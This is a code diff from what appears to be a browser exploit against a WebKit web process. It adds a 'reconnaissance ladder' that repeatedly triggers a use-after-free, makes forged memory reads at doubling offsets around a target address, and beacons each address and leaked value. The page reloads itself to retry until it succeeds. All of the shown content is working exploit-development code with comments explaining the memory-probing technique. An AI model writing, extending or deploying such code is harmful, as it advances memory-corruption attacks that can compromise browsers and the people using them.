@@ -143,6 +143,31 @@ if (attempt >= MAX) {
       bk('PAIR', 'A-surv,B-surv|addr=' + tgtHex + '|lwB=' + leaked2 + '|hexB=' + lw2 + ' => T mapped, big extent');
       try { localStorage.setItem('v911_hit', tgtHex + '|A+B|' + lw2); } catch(e) {}
     }
+
+    /* anchor reconnaissance: the landing is fresh in this WebProcess.
+       Doubling ladder outward from T, one forged read per rung; each rung
+       beacons its address before the read and its value after. A fault ends
+       the process mid-ladder — the pre-read beacon marks the furthest mapped
+       rung. Values at State+0x30 quantize by sizeof(State) (448 on 14.10,
+       open on 14.22) — dumps let the drop measure the fork stride. */
+    var RUNGS = [0x200, 0x600, 0xE00, 0x1E00, 0x3E00, 0x7E00, 0xFE00, 0x1FE00, 0x3FE00, 0x7FE00, 0xFFE00, 0x1FFE00];
+    for (var side = 0; side < 2; side++) {
+      var sign = (side === 0) ? 1 : -1;
+      for (var ri = 0; ri < RUNGS.length; ri++) {
+        var off = sign * RUNGS[ri];
+        var aLo = (off >= 0) ? (tgtLo + off) : (tgtLo + off);
+        var aHi = tgtHi;
+        if (aLo < 0) { aLo += 4294967296; aHi -= 1; }
+        if (aLo > 4294967295) { aLo -= 4294967296; aHi += 1; }
+        var aHex = '0x' + ('00000000' + aHi.toString(16)).slice(-8) + ('00000000' + aLo.toString(16)).slice(-8);
+        var cR = uafCycle();
+        if (!cR) { bk('RECON-END', 'nouaf at off=' + off); say('recon end: no uaf'); return; }
+        bk('RECON-PRE', aHex);
+        var val = forge(cR, aHi, aLo, 1, 1);
+        bk('RECON', aHex + '=' + hex(val));
+      }
+    }
+    bk('RECON-OK', 'ladder complete around ' + tgtHex);
     bk('DONE', 'T=' + tgtHex + ' attributed-mapped');
   }
   if (!hit) { setTimeout(function(){ location.reload(); }, 800); }
